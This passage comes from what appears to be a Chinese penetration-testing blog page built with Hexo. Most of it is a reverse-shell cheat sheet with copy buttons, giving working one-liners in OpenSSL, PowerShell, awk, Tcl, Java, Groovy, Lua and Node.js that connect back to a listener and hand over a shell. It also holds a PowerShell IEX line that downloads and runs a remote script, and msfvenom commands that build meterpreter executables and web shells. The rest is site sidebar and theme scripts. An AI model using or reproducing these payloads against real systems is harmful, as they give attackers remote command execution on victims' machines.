+<button onclick="copy(&#39;ssl02&#39;);">Copy</button>
+or
+<pre id="ssl03">ncat --ssl -vv -l -p 8080</pre>
+<button onclick="copy(&#39;ssl03&#39;);">Copy</button>
+Victim:
+<pre id="ssl04">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 127.0.0.1:8080 &gt; /tmp/s; rm /tmp/s</pre>
+<button onclick="copy(&#39;ssl04&#39;);">Copy</button>
+
+<h3>Powershell:</h3>
+<pre id="ps01">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
+<button onclick="copy(&#39;ps01&#39;);">Copy</button>
+<pre id="ps02">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
+<button onclick="copy(&#39;ps02&#39;);">Copy</button>
+<pre id="ps03">powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')</pre>
+<button onclick="copy(&#39;ps03&#39;);">Copy</button>
+
+<h3>Awk:</h3>
+<pre id="awk01">awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/8080"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}' /dev/null</pre>
+<button onclick="copy(&#39;awk01&#39;);">Copy</button>
+
+<h3>TCLsh</h3>
+<pre id="tcl01">echo 'set s [socket 127.0.0.1 8080];while 42 { puts -nonewline $s "shell&gt;";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh</pre>
+<button onclick="copy(&#39;tcl01&#39;);">Copy</button>
+
+<h3>Java:</h3>
+<pre id="java01">r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/127.0.0.1/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
+p.waitFor()</pre>
+<button onclick="copy(&#39;java01&#39;);">Copy</button>
+<pre id="java02">String host="127.0.0.1";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
+<button onclick="copy(&#39;java02&#39;);">Copy</button>
+<pre id="java03">Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();</pre>
+<button onclick="copy(&#39;java03&#39;);">Copy</button>
+
+<h3>War:</h3>
+<pre id="war01">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f war &gt; reverse.war
+strings reverse.war | grep jsp # in order to get the name of the file</pre>
+<button onclick="copy(&#39;war01&#39;);">Copy</button>
+
+<h3>Lua:</h3>
+Linux only
+<pre id="lua01">lua -e "require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</pre>
+<button onclick="copy(&#39;lua01&#39;);">Copy</button><br>
+Windows and Linux
+<pre id="lua02">lua5.1 -e 'local host, port = "127.0.0.1", 8080 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</pre>
+<button onclick="copy(&#39;lua02&#39;);">Copy</button>
+
+<h3>NodeJS:</h3>
+<pre id="ndjs01">(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "127.0.0.1", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();</pre>
+<button onclick="copy(&#39;ndjs01&#39;);">Copy</button>
+<pre id="ndjs02">require('child_process').exec('nc -e /bin/sh 127.0.0.1 8080')</pre>
+<button onclick="copy(&#39;ndjs02&#39;);">Copy</button>
+<pre id="ndjs03">-var x = global.process.mainModule.require
+-x('child_process').exec('nc 127.0.0.1 8080 -e /bin/bash')</pre>
+<button onclick="copy(&#39;ndjs03&#39;);">Copy</button>
+<pre id="ndjs04">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</pre>
+<button onclick="copy(&#39;ndjs04&#39;);">Copy</button>
+
+<h3>Groovy:</h3>
+
+<pre id="groovy01">String host="127.0.0.1";
+int port=8080;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
+<button onclick="copy(&#39;groovy01&#39;);">Copy</button>
+
+<h3>Meterpreter Shell:</h3>
+<pre id="msf01">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f exe &gt; reverse.exe</pre>
+<button onclick="copy(&#39;msf01&#39;);">Copy</button>
+<pre id="msf02">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f exe &gt; reverse.exe</pre>
+<button onclick="copy(&#39;msf02&#39;);">Copy</button>
+<pre id="msf03">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f elf &gt;reverse.elf</pre>
+<button onclick="copy(&#39;msf03&#39;);">Copy</button>
+<pre id="msf04">msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f elf &gt;reverse.elf</pre>
+<button onclick="copy(&#39;msf04&#39;);">Copy</button>
+<pre id="msf05">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f elf &gt; shell.elf</pre>
+<button onclick="copy(&#39;msf05&#39;);">Copy</button>
+<pre id="msf06">msfvenom -p windows/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f exe &gt; shell.exe</pre>
+<button onclick="copy(&#39;msf06&#39;);">Copy</button>
+<pre id="msf07">msfvenom -p osx/x86/shell_reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f macho &gt; shell.macho</pre>
+<button onclick="copy(&#39;msf07&#39;);">Copy</button>
+<pre id="msf08">msfvenom -p windows/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f asp &gt; shell.asp</pre>
+<button onclick="copy(&#39;msf08&#39;);">Copy</button>
+<pre id="msf09">msfvenom -p java/jsp_shell_reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f raw &gt; shell.jsp</pre>
+<button onclick="copy(&#39;msf09&#39;);">Copy</button>
+<pre id="msf10">msfvenom -p java/jsp_shell_reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f war &gt; shell.war</pre>
+<button onclick="copy(&#39;msf10&#39;);">Copy</button>
+<pre id="msf11">msfvenom -p cmd/unix/reverse_python LHOST="127.0.0.1" LPORT=8080 -f raw &gt; shell.py</pre>
+<button onclick="copy(&#39;msf11&#39;);">Copy</button>
+<pre id="msf12">msfvenom -p cmd/unix/reverse_bash LHOST="127.0.0.1" LPORT=8080 -f raw &gt; shell.sh</pre>
+<button onclick="copy(&#39;msf12&#39;);">Copy</button>
+<pre id="msf13">msfvenom -p cmd/unix/reverse_perl LHOST="127.0.0.1" LPORT=8080 -f raw &gt; shell.pl</pre>
+<button onclick="copy(&#39;msf13&#39;);">Copy</button>
+
+
+<h3>Xterm:</h3>
+<pre id="xterm001">xterm -display 127.0.0.1:1
+Xnest :1
+xhost +targetip</pre>
+<button onclick="copy(&#39;xterm001&#39;);">Copy</button>
+</div>
+
+
+
+
+<script>(function (w, d, s, id) {
+            if (typeof (w.webpushr) !== 'undefined') return; w.webpushr = w.webpushr || function () { (w.webpushr.q = w.webpushr.q || []).push(arguments) }; var js, fjs = d.getElementsByTagName(s)[0]; js = d.createElement(s); js.id = id; js.async = 1; js.src = "https://cdn.webpushr.com/app.min.js";fjs.parentNode.appendChild(js);}(window, document, 'script', 'webpushr-jssdk'));webpushr('setup', { 'key': 'BKlorLZnBq1iMFfk3xnjGJjBLNqEm1J1Bi-iRHabMhNYHjT46u-7wQUWjEMij1R6p1CyK6GjOAizKFpbF9XDjYU' });</script></body></html></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/txx.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Li qun</div><div class="author-info__description">ailiqun.xyz@gmail.com</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ailiqun.xyz@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">你总是来去如风 <img src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/xx.gif"></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" title="在线工具汇总"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post1.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="在线工具汇总"/></a><div class="content"><a class="title" href="/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" title="在线工具汇总">在线工具汇总</a><time datetime="2022-07-24T12:13:00.000Z" title="发表于 2022-07-24 20:13:00">2022-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/05/H3C-IMC-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="H3C IMC 命令执行"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post6.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="H3C IMC 命令执行"/></a><div class="content"><a class="title" href="/2021/06/05/H3C-IMC-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="H3C IMC 命令执行">H3C IMC 命令执行</a><time datetime="2021-06-05T14:23:00.000Z" title="发表于 2021-06-05 22:23:00">2021-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/05/%E7%94%A8%E5%8F%8BNC-rce/" title="用友NC BshServlet 命令执行"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="用友NC BshServlet 命令执行"/></a><div class="content"><a class="title" href="/2021/06/05/%E7%94%A8%E5%8F%8BNC-rce/" title="用友NC BshServlet 命令执行">用友NC BshServlet 命令执行</a><time datetime="2021-06-05T13:21:00.000Z" title="发表于 2021-06-05 21:21:00">2021-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/20/%E6%9F%900A-%E5%85%A8%E7%89%88%E6%9C%ACgetshell/" title="某0A 全版本getshell"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post7.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某0A 全版本getshell"/></a><div class="content"><a class="title" href="/2021/05/20/%E6%9F%900A-%E5%85%A8%E7%89%88%E6%9C%ACgetshell/" title="某0A 全版本getshell">某0A 全版本getshell</a><time datetime="2021-05-20T08:11:00.000Z" title="发表于 2021-05-20 16:11:00">2021-05-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/20/%E6%9F%90OA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" title="某OA 任意用户登录"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某OA 任意用户登录"/></a><div class="content"><a class="title" href="/2021/05/20/%E6%9F%90OA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" title="某OA 任意用户登录">某OA 任意用户登录</a><time datetime="2021-05-20T08:10:00.000Z" title="发表于 2021-05-20 16:10:00">2021-05-20</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"><span class="card-category-list-name">安全知识</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/"><span class="card-category-list-name">工具</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="card-category-list-name">渗透测试</span><span class="card-category-list-count">4</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"><span class="card-category-list-name">在线工具汇总</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/"><span class="card-category-list-name">渗透记录</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/"><span class="card-category-list-name">渗透记录</span><span class="card-category-list-count">2</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="card-category-list-name">渗透测试</span><span class="card-category-list-count">2</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">漏洞复现</span><span class="card-category-list-count">14</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/Apache-Druid/" style="font-size: 1.1em; color: #999">Apache Druid</a> <a href="/tags/CVE-2020-17518/" style="font-size: 1.1em; color: #999">CVE-2020-17518</a> <a href="/tags/CVE-2020-17519/" style="font-size: 1.1em; color: #999">CVE-2020-17519</a> <a href="/tags/H3C/" style="font-size: 1.1em; color: #999">H3C</a> <a href="/tags/Netsparker/" style="font-size: 1.1em; color: #999">Netsparker</a> <a href="/tags/c%E6%AE%B5/" style="font-size: 1.1em; color: #999">c段</a> <a href="/tags/getshell/" style="font-size: 1.23em; color: #999ea6">getshell</a> <a href="/tags/rce/" style="font-size: 1.37em; color: #99a4b2">rce</a> <a href="/tags/sql/" style="font-size: 1.1em; color: #999">sql</a> <a href="/tags/sqlmap/" style="font-size: 1.1em; color: #999">sqlmap</a> <a href="/tags/sqlmap%E4%BD%BF%E7%94%A8/" style="font-size: 1.1em; color: #999">sqlmap使用</a> <a href="/tags/thinkPHP/" style="font-size: 1.1em; color: #999">thinkPHP</a> <a href="/tags/waf/" style="font-size: 1.1em; color: #999">waf</a> <a href="/tags/webshell/" style="font-size: 1.1em; color: #999">webshell</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 1.1em; color: #999">命令执行</a> <a href="/tags/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/" style="font-size: 1.1em; color: #999">在线工具</a> <a href="/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/" style="font-size: 1.1em; color: #999">安全知识</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 1.23em; color: #999ea6">实战</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 1.1em; color: #999">密码</a> <a href="/tags/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/" style="font-size: 1.1em; color: #999">密码抓取</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 1.1em; color: #999">工具使用</a> <a href="/tags/%E5%BE%AE%E4%BF%A1rce/" style="font-size: 1.1em; color: #999">微信rce</a> <a href="/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/" style="font-size: 1.1em; color: #999">思维导图</a> <a href="/tags/%E6%B3%9B%E5%BE%AE/" style="font-size: 1.1em; color: #999">泛微</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.1em; color: #999">渗透测试</a> <a href="/tags/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" style="font-size: 1.1em; color: #999">渗透笔记</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.5em; color: #99a9bf">漏洞复现</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size: 1.1em; color: #999">漏洞扫描</a> <a href="/tags/%E7%94%A8%E5%8F%8B/" style="font-size: 1.1em; color: #999">用友</a> <a href="/tags/%E7%94%A8%E5%8F%8BGRP-U8/" style="font-size: 1.1em; color: #999">用友GRP-U8</a> <a href="/tags/%E7%A0%B4%E8%A7%A3%E8%BD%AF%E4%BB%B6/" style="font-size: 1.1em; color: #999">破解软件</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size: 1.23em; color: #999ea6">绕过</a> <a href="/tags/%E7%BD%91%E7%AB%99%E7%AE%A1%E7%90%86/" style="font-size: 1.1em; color: #999">网站管理</a> <a href="/tags/%E8%87%B4%E8%BF%9COA/" style="font-size: 1.1em; color: #999">致远OA</a> <a href="/tags/%E8%87%B4%E8%BF%9Coa/" style="font-size: 1.1em; color: #999">致远oa</a> <a href="/tags/%E8%8F%9C%E5%88%80/" style="font-size: 1.1em; color: #999">菜刀</a> <a href="/tags/%E8%93%9D%E5%87%8C/" style="font-size: 1.1em; color: #999">蓝凌</a> <a href="/tags/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/" style="font-size: 1.1em; color: #999">记一次渗透</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 1.1em; color: #999">记录</a> <a href="/tags/%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD/" style="font-size: 1.1em; color: #999">软件下载</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">七月 2022</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/06/"><span class="card-archive-list-date">六月 2021</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/05/"><span class="card-archive-list-date">五月 2021</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/04/"><span class="card-archive-list-date">四月 2021</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/02/"><span class="card-archive-list-date">二月 2021</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/01/"><span class="card-archive-list-date">一月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/11/"><span class="card-archive-list-date">十一月 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/10/"><span class="card-archive-list-date">十月 2020</span><span class="card-archive-list-count">2</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">30</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2020-09-09T04:00:00.000Z"></div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">20.1k</div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2021-06-05T14:49:57.426Z"></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Li qun</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/js/utils.js"></script><script src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/js/search/local-search.js"></script><div class="js-pjax"><script async="async">var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})
+setTimeout(function(){preloader.endLoading();}, 3000);</script></div><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'LHEeV46JNDnW2PY1KjVTLy2J-MdYXbMMI',
+      appKey: 'XESiWusPnVBEz6s4AhXF6ONB',
+      placeholder: '说点什么吗',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-cn',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/订阅.js"></script><script src="https://cdn1.lncld.net/static/js/3.5.0/av-min.js"></script><script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script><script src='/js/动态标题.js'></script><script src="//lib.baomitu.com/jquery/3.3.1/jquery.min.js"></script><script src="https://myhkw.cn/api/player/1613835026120" id="myhk" key="1613835026120" m="1"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="暴富" data-fontsize="15px" data-random="false" async="async"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  if (typeof gtag === 'function') {
+    gtag('config', '', {'page_path': window.location.pathname});
+  }
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+
+document.addEventListener('pjax:send', function () {
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
